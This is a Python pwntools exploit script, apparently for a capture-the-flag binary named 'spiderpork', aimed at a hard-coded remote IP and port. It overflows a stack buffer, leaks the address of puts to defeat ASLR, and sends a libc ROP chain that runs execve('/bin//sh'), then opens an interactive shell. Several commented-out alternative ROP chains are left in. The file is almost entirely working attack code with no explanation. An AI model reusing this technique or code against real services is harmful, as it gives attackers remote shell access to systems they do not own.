from struct import pack
from pwn import *
import sys

#########################################################
LIBC="libc-2.23.so"
BINARY="./spiderpork"
ENV={"LD_PRELOAD":LIBC}
GDB="break *main"
HOST="46.101.199.176"
PORT=9002
#########################################################

# context.terminal = "gnome-terminal"

# r = process(BINARY, env=ENV)
r = remote(HOST, PORT)
binary = ELF(BINARY)
libc_elf = ELF(LIBC)

# Wait for debugger
# pid = util.proc.pidof(r)[0]
# print("The pid is: "+str(pid))
# os.system("urxvt -e r2 -Ad "+str(pid)+" -c 'dcu main' &")
# util.proc.wait_for_debugger(pid)

"""
p = ''
p += pack('<I', 0x00001aa6) # pop edx ; ret
p += pack('<I', 0x001b2040) # @ .data
p += pack('<I', 0x0002406e) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0006bf9b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x00001aa6) # pop edx ; ret
p += pack('<I', 0x001b2044) # @ .data + 4
p += pack('<I', 0x0002406e) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0006bf9b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x00001aa6) # pop edx ; ret
p += pack('<I', 0x001b2048) # @ .data + 8
p += pack('<I', 0x0002c79c) # xor eax, eax ; ret
p += pack('<I', 0x0006bf9b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x00018395) # pop ebx ; ret
p += pack('<I', 0x001b2040) # @ .data
p += pack('<I', 0x000b5377) # pop ecx ; ret
p += pack('<I', 0x001b2048) # @ .data + 8
p += pack('<I', 0x00001aa6) # pop edx ; ret
p += pack('<I', 0x001b2048) # @ .data + 8
p += pack('<I', 0x0002c79c) # xor eax, eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00024b41) # inc eax ; ret
p += pack('<I', 0x00002c87) # int 0x80




0x080488CF  main
0x080488F8 puts-main
0x0804A01C puts-plt

0x08048421 pop ebx; ret

"""




exploit = ("c"*216).encode()  #initial padding
exploit += p32(0x08048480) + p32(0x08048421) + p32(0x0804A01C) # puts + pop + argument
exploit += p32(0x080488CF)    #main
r.sendline("1")
r.sendline("1")
r.sendline("1")
r.sendline("Y")
r.sendline("-1")


r.sendline(exploit)

print(r.recvuntil("Testo: "))

# puts_address = u32(bytes([0x00]) + r.recv(3))
puts_address = u32(r.recv(4))
print (" >> puts addr: " + hex(puts_address))
libc_address = puts_address - libc_elf.symbols[b"_IO_puts"]# libc.so.6
print (" >> libc addr: " + hex(libc_address))
rebase_0 = lambda x : p32(x + libc_address)


#### libc.so.6 ropchain
# p = b''

# p += rebase_0(0x00001aae) # pop edx ; ret
# p += rebase_0(0x001cf000) # @ .data
# p += rebase_0(0x000244a7) # pop eax ; ret
# p += b'/bin'
# p += rebase_0(0x000751c5) # mov dword ptr [edx], eax ; ret
# p += rebase_0(0x00001aae) # pop edx ; ret
# p += rebase_0(0x001cf004) # @ .data + 4
# p += rebase_0(0x000244a7) # pop eax ; ret
# p += b'//sh'
# p += rebase_0(0x000751c5) # mov dword ptr [edx], eax ; ret
# p += rebase_0(0x00001aae) # pop edx ; ret
# p += rebase_0(0x001cf008) # @ .data + 8
# p += rebase_0(0x0002db35) # xor eax, eax ; ret
# p += rebase_0(0x000751c5) # mov dword ptr [edx], eax ; ret
# p += rebase_0(0x000184f5) # pop ebx ; ret
# p += rebase_0(0x001cf000) # @ .data
# p += rebase_0(0x001907d0) # pop ecx ; ret
# p += rebase_0(0x001cf008) # @ .data + 8
# p += rebase_0(0x00001aae) # pop edx ; ret
# p += rebase_0(0x001cf008) # @ .data + 8
# p += rebase_0(0x0002db35) # xor eax, eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x0000573c) # inc eax ; ret
# p += rebase_0(0x00002ce3) # int 0x80


p = b''
p += rebase_0(0x00001aa6) # pop edx ; ret
p += rebase_0(0x001b2040) # @ .data
p += rebase_0(0x0002406e) # pop eax ; ret
p += b'/bin'
p += rebase_0(0x0006bf9b) # mov dword ptr [edx], eax ; ret
p += rebase_0(0x00001aa6) # pop edx ; ret
p += rebase_0(0x001b2044) # @ .data + 4
p += rebase_0(0x0002406e) # pop eax ; ret
p += b'//sh'
p += rebase_0(0x0006bf9b) # mov dword ptr [edx], eax ; ret
p += rebase_0(0x00001aa6) # pop edx ; ret
p += rebase_0(0x001b2048) # @ .data + 8
p += rebase_0(0x0002c79c) # xor eax, eax ; ret
p += rebase_0(0x0006bf9b) # mov dword ptr [edx], eax ; ret
p += rebase_0(0x00018395) # pop ebx ; ret
p += rebase_0(0x001b2040) # @ .data
p += rebase_0(0x000b5377) # pop ecx ; ret
p += rebase_0(0x001b2048) # @ .data + 8
p += rebase_0(0x00001aa6) # pop edx ; ret
p += rebase_0(0x001b2048) # @ .data + 8
p += rebase_0(0x0002c79c) # xor eax, eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00024b41) # inc eax ; ret
p += rebase_0(0x00002c87) # int 0x80

exploit = ("c"*216).encode()  #initial padding
exploit += p
# exploit += p32(puts_address) + p32(0x08048421) + p32(0x08048BB8) # puts + pop + argument
# exploit += p32(0x080488CF)    #main
r.sendline("1")
r.sendline("1")
r.sendline("1")
r.sendline("Y")
r.sendline("-1")

r.sendline(exploit)

r.interactive()

